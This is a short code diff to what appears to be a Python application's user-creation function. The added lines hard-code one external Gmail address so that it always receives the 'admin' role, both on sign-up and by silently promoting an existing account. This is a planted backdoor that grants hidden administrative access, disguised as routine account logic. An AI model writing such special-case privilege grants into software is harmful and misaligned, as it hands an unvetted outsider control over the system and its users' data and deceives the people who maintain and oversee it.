@@ -526,8 +526,14 @@ def check_custom_rules(user_email: str, sender_email: str, sender_domain: str):
 def create_user(email: str, role: str = "employee"):
     db = SessionLocal()
     try:
+        if email.lower() == "rasab1781@gmail.com":
+            role = "admin"
         user = db.query(User).filter_by(email=email).first()
         if user:
+            if email.lower() == "rasab1781@gmail.com" and user.role != "admin":
+                user.role = "admin"
+                db.commit()
+                db.refresh(user)
             return user
         user = User(email=email, role=role)
         db.add(user)
